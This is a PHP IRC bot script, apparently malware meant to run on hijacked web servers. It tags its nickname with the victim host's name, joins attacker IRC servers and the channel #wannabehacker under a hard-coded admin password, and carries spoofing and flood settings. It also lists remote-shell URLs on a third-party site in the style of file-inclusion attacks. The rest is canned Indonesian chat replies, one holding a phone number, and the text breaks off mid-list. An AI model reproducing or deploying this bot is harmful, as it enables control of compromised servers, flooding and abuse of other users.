<?php
#######################
set_time_limit(0);
define ('CRLF', "\r\n");
$modbot=new module_bot;
#######################
$Alertbotphp=("
####################################################<br>
##[                                              ]##<br>
##[              casper_kae@yahoo.com            ]##<br>
##[           Created by Kiss_Me or Alert        ]##<br>
##[                 Thanks to mama               ]##<br>
##[           Casper_Cell Parijatah srono        ]##<br>
##[                                              ]##<br>
####################################################<br>
");
#######################
$servban=array("irc.lumajangcrew.co.cc");
#################### [ CONFIG BOT ] #######################
$servpassbota=array("","1","2","3");
$servpassbotb=array("1","2","3","4","5","6","7","8","9");
$servpassbot="idws".$servpassbota[rand(0,count($servpassbota) - 1)].$servpassbotb[rand(0,count($servpassbotb) - 1)];
$bot['admin']="RJ-45";
$bot['pass']="wht";
$bot['inick']="";
$bot['pnick']="";
$bot['basechan']="#wannabehacker";
$bot['roomnet']="";
$bot['roomkey']="";
$bot['local']="localhost";
$bot['server']=$servban[rand(0,count($servban) - 1)];
$bot['port']=6667;
if($bot['server']=="irc.wannabehacker.org"){
$bot['userver']=1;
}
else{
$bot['userver']=0;
}
$bot['pserver']=$servpassbot;
/////////////////////////////////////
$bot['nick']=$modbot->rnd_nick();
$bot['ident']=$modbot->rnd_nickorg();
$bot['realname']=$modbot->rnd_real();$nickgantinya=$bot['admin'];
$bagitarget=OFF;$botaktif="OFF";$reident="OFF";$truhostpart="";
################# [ END CONFIG BOT ] ######################
#################### [ AUTH VAR ] #########################
$Admin=strtolower($bot['admin']);
$BOT_PASSWORD=strtolower($bot['pass']);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Owner","ident"=>"","host"=>"","time",""));
################## [ END AUTH VAR ] #######################
$versbot=array("nerakaIRC vRVF beta version by Blockhermaaf kena flood ringan ^_^",
               "Xirc v1.0 on (Nokia6101/04.10 )",
               "JedIrc v3.2.1 on (Nokia6275i/2005_w21_pb_)",
               "MACHO-Irc v0.35 by Macho crew (Anak_kadal) on...........Ma`af perangkat anda tidak bisa mendeteksi perangkat lain.....!!!!!!!!(ERROR READING HARDWARE)",
               "mIRC v6.21 Khaled Mardam-Bey",
               "ga pernah ngeliat kalkulator bisa di pake buat chat ya??? --",
               "KulupanIRc v1.01a by danoxyde on ASUS P5LD2-X/1333 with Intel Core 2 Duo E4500 @2.20 Ghz",
               "Xirc v1.0 on (NokiaN70-1/5.0737.3.0.1 )",
               "nerakaIRC v0.2 version beta by Blockher onkalkulator casio fx-900 plus (http://blockher.peperonity.com/)",
               "JmIrc-G v.4.1 by puy`Yank on Nokia 2626i Up-grade Edition 8GB with LCD flat 29",
               "JedIrc v3.2.1 on (SonyEricssonW300i/R4EA031)",
               "eggdrop v1.6.18",
               "FeeLCoMz AI PHPBot Script By 8,1)|(1,9 FraNGky ngek@PHP.bot 8,1)|(",
               "JedIrc v3.2 on (Nokia2600c-2/05.61)",
               "mIRC v6.35 Khaled Mardam-Bey",
               "IRCQ dewek by GUE! (JO INCENG2 AKU RA SEMPAKAN COK)",
               "jmIrc-m v0.34a by Archangel on j2me");
$pingsiapa="";

###################### [ VAR VAR ] ########################
$tsu=array("m","z","p","t","r","x","w","f","h","k","q","c","L");
$nbota=array("1","2","3","4","5","6","7","8","9","0");
$nbotb=array("1","2","3","4","5","6","7","8","9","0");
$zodiak = array("capricorn", "aquarius", "pisces", "aries", "taurus", "gemini", "cancer", "leo", "virgo", "libra", "scorpio", "sagitarius");
$nbotna=$nbota[rand(0,count($nbota) - 1)];
$nbotnb=$nbota[rand(0,count($nbota) - 1)];
$nbot=$nbotna.$nbotnb;
$shellq="telek.txt??";
$floddban="ON";$GuardV="ON";
$ctcpversi=$versbot[rand(0,count($versbot) - 1)];
$ctcpfinger="8,1)|(1,9 FraNGky ngek@PHP.bot 8,1)|(";
$user_chan_arr[][]="";
$notarget=0;
$greetmsg["nick"]["nama"]="";
$greetmsg["nick"]["msg"]="";

$banlist[$bot['basechan']]="";
$ping["ping"]["nick"]="";
$ping["ping"]["chan"]="";

$jmlspoof["irc.ads.net.id"]=0;
$isisp[1]["irc.ads.net.id"]["ident"]="gw";
$isisp[1]["irc.ads.net.id"]["spoof"]="hantu.rese.a.biz";
$isisp[1]["irc.ads.net.id"]["pass"]="spoof1";

$kmusedan[0]["contoh"][]="";
$kmusedan[0]["definisi"][]="";
$kmusedan[0]["kata"][]="";
$kmjml["apa"]="";

$chanson=strtolower($bot['basechan']);
$listison[0]=strtolower($bot['admin']);
$ada1[$listison[0]]=false;
$ada2[$listison[0]]=true;
$hitungnick=1;
$goboom=0;$tmboom=0;$onboom="off";$targetboom="";$warnabenar="";$bw[0]="";$chanboom="";$timeboom=30;
$warnaboom="Merah;Kuning;Hijau;Ungu;Coklat;Hitam;Putih;Abu-abu;Emas;Silver;Maroon;Jingga;Orange";
$txttepmp='';$textemp='';$txttepmx='';$temptex='';
$textrep=0;$Maxreep=2;$maxkar=200;
$systembot['ping'][strtolower($bot['basechan'])]="4OFF";
$systembot['NGOMONG'][strtolower($bot['basechan'])]=="4OFF";
$clista='cr';$textemp='';
$asalseen['FraNGky ngek']=date("l, j F Y H:i:s");$asalseen['basechanchanel']='#frangky';$asalseen['statusFraNGky ngek']="FraNGky ngekteam";
$shellacak=array("http://jjang.oxwiz.co.kr/zboard//board/zero_vote/.cok/seen.tcl????");
$shellgue=$shellacak[rand(0,count($shellacak) - 1)];
$iscy=time();$isberita=time();
$timercy=2000;$statushost=0;$botcsign="Me";
$timerberita=3000;
$timermsg=2000;
$timeract=2000;
$ikutbos="OFF";
#################### [ END VAR VAR ] ######################
#################### [ CREWET ] ######################
$autojawabpv = array(
"yapp",
"u uh",
"u 1",
"Amu ?",
"<nick> nak mana??",
"srono aja",
"km ?",
"lho",
"lok <nick>???",
"MuaCh",
"Aslinya mana <nick>??",
"<nick> msh skulah ta?",
"aq srono <nick>",
"trus?",
"ew ",
"boleh ajah",
"idih",
"gah ah",
"gak pa2 kok <nick>",
"lok <nick>??",
"<nick> maunya apa sih?",
"ok",
"asl plz",
"085655818750 ni no hp Q <nick>",
"kok gitu sih <nick>?",
"gak mau Aq wek",
"halo"
);
$wbmsg = array(
"webee <nick> :-D",
"Selamat Datang <nick>",
"Wew.. Xeaxeaxea.. <nick> pa kabar?",
"Baru OL ya <nick>?",
"Met datang di <chan>, <nick>",
"Hadaaah.. <nick> baru bangun tidur y? Cuci muka dulu sana..",
"hai <nick>!",
"Wah.. Master <nick> dateng nih..",
"<nick> dah mandi blon?",
"baru join y <nick>?",
"<nick>, ada yg nyariin tuh..banyak utang ya?",
"<nick>, td kemana aja?",
"ngpn aja barusan <nick>?",
"<nick> dah makan blom?",
"hmm.. <nick> udah mulai beraksi ne kayaknya",
"kamu baik deh <nick>",
"<nick> udah siyap2 dg aksinya..",
"<nick>, kamu cuakep deh..",
"aku seneng liat <nick>.. orgnya ramah, baik, cakep lagi.",
"nicknya bagus loh <nick>..",
"<nick>, senyummu bikin hatiku berdebar..",
"wow.. <nick> ini salah satu juragan warnet neh..",
"asyiiik.. master <nick> dateng..",
"awas, <nick> adalah hacker yg pernah jatuh cinta sama Exploiteder",
"<nick>, wb selamat datang",
"wah.. dimana-mana ada <nick>",
"gmn kabarnya <nick>?",
"dah maem blom <nick>?",
"Asyiik.. si <nick> dateng",
"<nick>, kenalin gw $namaku",
"blom bobo toh <nick>?",
"Btw, <nick> ini adalah Carder terkaya didunia..",
"<nick> ini pernah menyaingi Kevin Midnick dlm soal hacking",
"Waduwh, <nick> kok baru join?",
"Ada yg bilang <nick> jago hacking, benarkah? ajarin domz..",
"wah.. <nick> td dicari locop tuh, katanya abis ngeflood..",
"Tolong donk <nick>.. ga bisa dibuka nih..",
"tolooong.. <nick> nyari aku sampai ke <chan>..",
"Wedew.. <nick> ini nyang suka nyebarin Virus rupanya..",
"Leh nalan ga <nick>?",
"Wow.. <nick> ini yg masuk infotainment kemaren yah?",
"<nick>, asl donk..",
"<nick>, nm km siapa seh?",
"chan <chan> jd rame klo ada si <nick>",
"kpn neh ketemuannya <nick>?",
"maaf ya <nick>, aku td ga sengaja ngintip kamu..",
"btw, <nick> udah kul apa masih skul?",
"wb <nick>, km anak mana neh?",
"tmn2 semua dah kenal <nick>, kan?",
"siapa sih yg g knal ma <nick>?",
"WoW <nick>, kok dah lama ga OL?",
"udah nyuci piring td <nick>?",
"<nick>, ada yg lebih bagus dari HIT ga?",
"ngapain aja di pasar tadi <nick>?",
"kayaknya km blom bruntung deh <nick>",
"<nick> blom ngantuk y?",
"weleh2, <nick> udah beraksi nih..",
"hai boss <nick>, bagi2 donk pulsanya! kikikiki..",
"leh nalan ga <nick>?",
"hihi,, <nick> lucu deh.. wkwkwkwk.. ",
"hayyah,, baru OL ya <nick>? xeaxeaexa"
);
$ngomongpamitpart = array(
"Lha kok part to joino lg ndek <chan> ntar tak kasi deh...!",
"Kok part si <nick> ? joino lg yo di <chan>",
"Km jelek lo lok part dr <chan> <nick> wkwkwkwk",
"lho malah metu <chan> .! gk jd tak kasi ez <nick>",
"hm <chan> kan keren kok part to <nick>?",
"di <chan> part gk pamid ma aQ se <nick>.!!",
"mo kmana <nick> ?? ntar joino lg ya di <chan>",
"<nick> joino agi ya di <chan> biar tambah rame",
"duh aQ kok ditinggal se <nick> joino agi di <chan>",
"eh ada yang panggil tu <nick> di <chan> kok malah kluar."

);
$jawabsapa = array(
"ada apa <nick> tayaank?",
"iya <nick> sayang",
"yup <nick>!",
"Hadaah.. si <nick> manggil mulu ich..",
"males ah <nick> ",
"nanti aja y <nick>",
"bentar dulu <nick>",
"ichh <nick> endel banget siy..",
"ga nich <nick>",
"ga jadi deh <nick>",
"Walaaah.. <nick>, apaah apaah?",
"hmm..<nick> mo tau ajah",
"Waxz <nick> gagagagaga",
"capee deh.. <nick>",
"apaah apaah <nick>?",
"sebel ah <nick>",
"<nick> jgn manggil2 terus donk..",
"$namaku cape dipanggil mulu <nick>",
"Eaxeaxea.. <nick> kangen yach?",
"Walah.. kikiki.. <nick> ini cerewet banget..",
"Hadeehh <nick>.. ~_~!"
);

$rmales = "lg males nih <nick>..";
$rmau = "aku mau koq <nick>!";
$rsanggup = "bisa kok <nick>";
$rboleh = "boleh kok <nick>";
$rsetuju = "iya <nick>";
$rthx = "makacih <nick>..";
$rbingung = "hmm..$namaku ga tau jg nih <nick>..";
$rgenit = "ich.. <nick> genit";

$respon_umum = array(
array("sepi","iya nih <nick> sepi bangetz.."),
array("makan","aduh aQ juga lom mkan ni <nick>.."),
array("ayank","ew <nick>! sayang hare.!"),
array(" beb","ada apa bebz <nick>???"),
array("brb","ok <nick>"),
array("tha","tha tha <nick>.."),
array("semua ","hi <nick>.."),
array("traktir","<nick>, aku jg ditraktir donk.. kikikiki"),
array("lapar","lho..? <nick> blom makan y?"),
array("pamit","uke dukeh <nick>, ati2 y.. tataw.."),
array("pamet","oke <nick>, ati2 y.. tataw.."),
array("pamed","seep <nick>, ati2 y.. thaaa"),
array("ngantuk","<nick> dah ngantuk y? tidur sana gih"),
array("bobo","oke deh <nick>, mimpiin aku y"),
array("bubu","silahkan <nick>, moga mimpi indah y"),
array("assalam","Wa'alaikumsalam <nick>"),
array("pagi","pagi <nick>"),
array("sore","sore <nick>"),
array("malam","malam <nick>"),
array("siang","siang <nick>"),
array("mandi","aku ikut donk <nick>..gagaga.."),
array("nunggu","ga nunggu kok <nick>"),
array("hayah","hayah?? napa <nick>?"),
array("hadeh","hadeh jg dah <nick>.. ghaghagha.."),
array("hadah","hadah? hadiah kalee..gagaga.."),
);

$guyonnya = array(
"",
""
);
$respon_pesan = array(
//Sapaan
array("hai ","hai jg <nick>"),
array("halo ","halo jg <nick>"),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn <nick>?"),
array("kbr","baik, km gmn <nick>?"),
array("webe","$rthx"),
array("wb","$rthx"),
array("tq","sama2 <nick>"),
array("makasi","sama2 <nick> :)"),
array("makaci","sama2 <nick>"),
array("nalin","hai.. aku $namaku"),
array("nalkan","hai.. aku $namaku"),
array("nalan","boleh koq <nick>.. u 1st"),
//Identitas
array("asl ","<nick>, aku $aslku"),
array("umur","<nick>, klo aq $aslku"),
array("nama","<nick>, aku $namaku .. u?"),
array("skul ","yup <nick>, aku skul."),
array(" kul ","<nick>, ga kul neh.."),
array("alamat","weleeehh.. rahasia donk <nick>.."),
array("nak mana","aQ $aslku <nick>"),
array(" tinggal ","<nick>, aku di rumah"),
array("cowo","blom, klo <nick> gmn?"),
array("pcr","blom, hihi.. klo <nick>?"),
array("pacaran","emangnya <nick> mau y pacaran ma $namaku?"),
array("pacar ","blom, <nick> ndiri gmn?"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong ttg apa <nick>?"),
array("curhat","mangnya mo curhat masalah apa <nick>?"),
array("nikah ","nikah? ich.. boro2 nikah ma <nick>"),
array("kawin ","kawin?? ich.. ogaaaah.."),
array("kencan","boleh <nick>, kpn neh kencannya?"),
array("besok","boleh <nick>.."),
array("mau ","$rmau"),
//Tuduhan
array("bohong","bohong? ngpn Q bohong.. <nick> kali yg bohong..kekeke"),
array("boong","boong? <nick> tuh yg boong.."),
array("males","yaa.. lagi males aja nih <nick>"),
array("lain","yg lain gmn <nick>?"),
array("laen","yg laen gmn <nick>?"),
array("GR ","<nick> tuh yg ke-GR-an.."),
array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
array("bot","bot itu gmn? kaya <nick> ntu ya?"),
array(" aneh","aneh gmn <nick>?"),
array("nipu","idiiich..siapa jg yg nipu <nick>.."),
//Kegiatan
array("mandi","klo aku udah mandi <nick>"),
array("makan","udah koq <nick>, klo <nick>?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>?"),
array("belanja","belanja dmn <nick>?"),
array("bobo ","$rmales"),
array("tidur ","$rmales"),
array("ngantuk ","blom neh <nick>.. xixi"),
array("ngpn","lg chat aja neh <nick>"),
array("ngapa","lg chat aja neh <nick>"),
//Pertanyaan
array("salam kenal ","salam kenal jg <nick>"),
array("kenal ","$namaku ga kenal tuh.. xixi"),
array("tau ","$namaku ga tau tuh.. xixi"),
array("napa","aq ga knp2 koq <nick>"),
array("knp","aq ga knp2 koq <nick>"),
array("kemana","disini aja tuh <nick>"),
array("lupa","aq ga lupa koq <nick>"),
array(" mana ","$rbingung"),
array("gimana","hmm.. gimana yach ? kikikiki.."),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.."),
array("love","I love u too, <nick>"),
array("jodoh","jodoh kalee <nick>"),
array("kangen","aku jg kangen km, <nick>"),
array("muach","muach <nick>.."),
array("uaach","idih, <nick> ga malu apa nyium2 aku didepan umum.."),
array("kiss","mo permen kiss ya <nick>?"),
array("cium","$rgenit"),
array("eluk ","$rgenit"),
array("elonin","jgn donk <nick>, kan malu.."),
//Additional
array("hihihi","kok <nick> ngetawain aku seh?"),
array("xixi","ngetawain aku y <nick>?"),
array("slap","auw <nick>! atit tau.."),
array("pokes","auw <nick>! atit tauuukk..."),
array("masuk","ih <nick> ngerezz"),
);

$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat",
"bagus","indah","jujur");

$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila",
"sinting","dudul","dodol","jahat","goblok","geblek","sialan"," bau","stres");

$badwordlist = array("jancu","jancok","pantek","pepek","kontol","anjrit","anjink",
"fuck","kentot","ngentot","taek","kelamin","ngesex"," ml ","anjenk","anjink",
"jajuk","torok"," keat ","dobol ","mbod ","asu ","cok","kawin ","anjing","sual ");

$rjorok = array(
"om..! <nick> ngomong jorok nih.. kick dunk pliss!",
"guys..! <nick> ini ga sopan banget.. kick dunk pliss!",
"hadah.. <nick> ga sopan ikz"
);

$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukanya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
);

$rpujian = array(
"makasih <nick>.. kamu jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja",
"tengkyu <nick>.. aduh $namaku g punya uang kecil nih.."
);
$namaBotPhpini="ert";
#################### [ END CREWET ] ######################
##################### [ CONNECT ] #####################
/////////////////
$servdef=array("plasa.id.allnetwork.org",
	       "velo.id.allnetwork.org",
               "telkom.id.allnetwork.org",
               "indika.id.allnetwork.org",
               "citra.id.allnetwork.org",
               "uii.id.allnetwork.org",
               "visit.id.allnetwork.org",
               "hotspeed.sg.allnetwork.org",
               "indo.id.allnetwork.org",
	       "cbn.id.allnetwork.org",
               "ads.id.allnetwork.org",
               "punc4k.id.allnetwork.org",
	       "wanxp.id.allnetwork.org",
               "jmn.id.allnetwork.org",
	       "irc.indotransdata.net",
               "sbp.id.allnetwork.org",
               "big.id.allnetwork.org",
               );
$keluar=0;$retry=count($servdef)+1;$attconnect=0;$rtdc=0;$botbsign="ss_";
/////////////////
echo "<body bgcolor=#000000 text=#0000FF>";
echo "<font color=#ff0000><a href=http://www.friendster.com/29164335>".$Alertbotphp."</a></font><br><br>";
################### [ CLASS IRC BOT ] #####################
class module_bot{
    function rnd_logo(){
        $nlogo=array("Casper","Casper",
                     "Casper","Casper",
                     "Casper","Casper",
                     "Casper","Casper"
                     );
        return $nlogo[rand(0,count($nlogo) - 1)];
    }
    function rand_str($size){
        $feed = "0123456789abcdefghijklmnopqrstuvwxyz";
        for ($i=0; $i < $size; $i++){$rand_str .= substr($feed, rand(0, strlen($feed)-1), 1);}
        return $rand_str;
    }
    function rnd_nick(){
        $serverasal= $_SERVER['HTTP_HOST'];
        if($serverasal==""){$serverasal="[N]";}else{$serverasal=str_replace(".","",$serverasal);$serverasal=str_replace("www","",$serverasal);$serverasal=substr($serverasal,0,3);$serverasal="[".$serverasal."]";}
        $nickbota=array("q","w","r","t","y","p","s","d","g","h","j","k","l","z","x","v","b","n","m");
        $nickbotb=array("e","y","u","i","o","a");
        $nickdepan="[".strtoupper($nickbota[rand(0,count($nickbota) - 1)])."]".$serverasal."-";
        $nickbotl=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotr=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbotu=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotd=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbot=$nickdepan.$nickbotl.$nickbotr.$nickbotu.$nickbotd;
        return $nickbot;
    }
    function rnd_nickorg(){
        $nickbot=array(
        "Abdulrazak","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda",
	"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
	"Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins",
	"Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
	"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
	"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
	"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse",
	"Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo","Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
	"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
	"Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Book","Bookbinder","Boone",
	"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
	"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
	"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
	"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
	"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
	"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
	"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
	"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
	"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
	"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
	"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
	"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
	"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
	"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
	"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
	"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
	"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
	"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
	"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
	"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
	"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
	"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
	"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
	"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
	"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
	"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
	"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
	"Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
	"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
	"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
	"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
	"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
	"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
	"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
	"Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder",
	"Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
	"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald",
	"Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
	"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio",
	"Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall",
	"Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty",
	"Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle",
	"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio",
	"MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
	"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin",
	"Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski",
	"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine",
	"Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield",
	"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak",
	"Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous",
	"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard",
	"Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
	"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos",
	"Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
	"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell",
	"Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte",
	"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton",
	"Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
	"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan",
	"Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
	"Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus",
	"States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
